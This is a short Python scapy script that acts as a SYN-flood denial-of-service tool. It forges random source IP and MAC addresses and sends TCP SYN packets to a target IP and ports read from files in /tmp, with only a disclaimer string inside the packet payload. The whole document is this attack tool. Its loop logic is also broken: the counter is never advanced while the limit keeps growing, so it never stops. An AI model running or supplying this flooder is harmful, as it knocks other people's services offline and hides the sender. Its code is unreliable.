from scapy.all import *
import random
import os
import sys

loop = int(sys.argv[1])
loop1 = 0
IPs=[]
open_port=[]
loop2 = 0

while loop1 < loop :
    Ip_srcA = random.randrange(0,255)
    Ip_srcB = random.randrange(0,255)
    Ip_srcC = random.randrange(0,255)
    Ip_scrD = random.randrange(0,255)
    source=str(Ip_srcA)+"."+str(Ip_srcB)+"."+str(Ip_srcC)+"."+str(Ip_scrD)
    loop1=loop1+1
    IPs.append(source)


file1 = open("/tmp/OPEN_PORT")
file2 = open("/tmp/IP2")
for i in file1:
    open_port.append(int(i))
for l in file2:
    m=str(l)
m=m.splitlines()


while loop2 < loop:
   
    for ip in IPs:
        print(loop2)
        Port_src = random.randrange(1,65534)
        sequence = random.randrange(1,300000)
        rand3=""
        rand1=""
        rand2=""
        for i in range (6):
         numberList = ["0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F"]
         rand1=random.choice(numberList)
         rand2=random.choice(numberList)
         rand3=rand3+rand1+rand2
         if i != 5:
          rand3=rand3+":"
        send(Ether(src=rand3)/IP(src=ip,dst=m)/TCP(sport=Port_src,dport=open_port,flags="S",seq=sequence)/"Hello World this Tools is Only for Test your Service on Internet dont use for Dangerous Purpose")
    print("send packet number",loop2)
    loop=loop+1

